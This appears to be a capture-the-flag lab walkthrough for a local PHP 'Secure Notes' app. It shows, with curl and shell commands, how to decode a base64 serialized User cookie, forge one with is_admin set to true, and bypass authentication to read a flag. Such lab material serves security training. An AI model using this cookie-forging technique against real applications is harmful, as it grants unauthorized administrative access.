# WEB-17: PHP Deserialization Auth Bypass

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-17 |
| 名称 | PHP Deserialization Auth Bypass |
| 技术/CVE | Insecure PHP deserialization |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10117 |

## 场景概述
- 技术：Insecure PHP deserialization
- 难度：L2
- 交付方式：docker
- 入口端口：10117
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | PHP Deserialization |
| Difficulty | L2 |
| Port | 10117 |
| Path | scenarios/web/php-deserialization/ |
| Type | docker |
| Service | Secure Notes App (PHP) |

### Attack Path Summary
```
Login as guest → Analyze serialized cookie → Forge admin cookie → Bypass authentication → Flag
```

### Prerequisites

#### Knowledge
- PHP序列化格式 (PHP serialization format): Understanding `O:classname:propcount:{...}` serialized object structure
- Base64编码 (Base64 encoding): Encoding and decoding cookie values for manipulation
- 对象属性操纵 (Object property manipulation): Modifying serialized object properties to change user roles

#### Tools
- curl: Send HTTP requests with cookie manipulation
- PHP CLI: Generate serialized PHP objects locally using PHP
- Burp Suite Decoder: Decode and modify base64-encoded cookies interactively

### Step-by-Step Exploitation

#### Step 1: Access the Login Page

Open the Secure Notes App login page.

```bash
curl http://localhost:10117/
```

#### Step 2: Login as Guest

Authenticate with guest credentials and capture the session cookie.

```bash
curl -c cookies.txt -X POST http://localhost:10117/login.php \
  -d "username=guest&password=guest123"
```

#### Step 3: Decode the Cookie

Read the cookie from the cookie jar and decode it to view the serialized PHP User object.

```bash
# Read the cookie value
COOKIE=$(grep creds cookies.txt | awk '{print $NF}')
echo "$COOKIE"
# Decode from base64
echo "$COOKIE" | base64 -d
```

Expected output: `O:4:"User":2:{s:8:"username";s:5:"guest";s:8:"is_admin";b:0;}`

#### Step 4: Forge an Admin Cookie

Modify the serialized object to set `is_admin` to `true` and `username` to `admin`, then base64-encode the result.

```bash
FORGED=$(echo 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}' | base64 -w0)
echo "$FORGED"
```

#### Step 5: Access the Application with Forged Cookie

Use the forged cookie to access the application as an admin user.

```bash
curl -b "creds=$FORGED" http://localhost:10117/
```

The flag is displayed in the response when `is_admin` evaluates to `true`.

### Flag Location
- In `index.php`, displayed when the deserialized User object has `is_admin == true`

### Verification Commands
```bash
FORGED=$(echo 'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}' | base64 -w0)
curl -s -b "creds=$FORGED" http://localhost:10117/ | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | PHP session/cookie serialization behavior |
| 侦察与前置条件 | Serialized object classes and authentication state handling |
| 核心漏洞与利用 | Craft an insecure PHP serialized object to bypass authentication |
| 权限、横向或影响 | Privileged application access |
| 验证 | Use the privileged response to retrieve the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
